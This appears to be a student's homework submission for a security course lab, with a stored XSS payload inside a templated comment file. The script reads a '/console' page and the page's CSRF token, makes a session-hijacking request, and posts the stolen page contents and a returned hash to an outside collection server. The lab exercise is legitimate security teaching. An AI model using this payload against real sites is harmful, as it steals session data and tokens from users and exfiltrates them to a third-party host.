/*
    !!!!!!!! IMPORTANT !!!!!!!
     In this task, you will craft a payload as a submitted post to exploit a stored XSS vulnerability.
    To receive full credit, you must submit your code using this file.
    Please follow the format outlined below.
*/

/*
    Your exploitable payload should look like:
    -> whaterver<script>X</script>whatever
    
    NOTE: You can include comments in the coding section.
    TODO: Please copy X into the coding section.
    
*/

/* Coding section start */

<script>
    fetch('/console')
        .then(response => response.text())
        .then(data => {
            submitSessionHijacking(data);
            fetch('https://cs6262.gtisc.gatech.edu/receive/skhadka9/1175', {
                method: 'POST',
                body: data
            });
        });

    function submitSessionHijacking(data) {
        const csrfToken = document.querySelector('[name=csrfmiddlewaretoken]').value;
        fetch('https://cs6262.gtisc.gatech.edu/session-hijacking/skhadka9', {
            method: 'POST',
            headers: {
                'X-CSRFToken': csrfToken
            }
        })
        .then(res => res.json())
        .then(data => {
            const hash = data.hash;
            if (hash) {
                return fetch('https://cs6262.gtisc.gatech.edu/receive/skhadka9/1175', {
                    method: 'POST',
                    headers: { 'Content-Type': 'text/plain' },
                    body: hash
                });
            }
            document.querySelector('#sessionHijackingResult').innerHTML = hash;
        })
        .catch(() => {});
    }
</script>

/* Coding section end */